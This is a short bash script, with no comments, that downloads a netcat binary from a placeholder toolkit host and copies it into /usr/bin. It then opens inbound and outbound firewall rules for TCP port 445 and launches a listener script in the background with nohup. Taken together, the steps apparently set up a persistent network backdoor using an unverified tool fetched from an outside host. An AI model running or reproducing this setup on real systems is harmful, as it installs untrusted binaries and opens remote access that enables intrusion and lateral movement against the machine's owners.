#!/bin/bash 
wget http://yourtookitsite.com/netcat
cp netcat /usr/bin
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 445 -m conntrack --ctstate NEW -j ACCEPT
nohup ./listener.sh & 

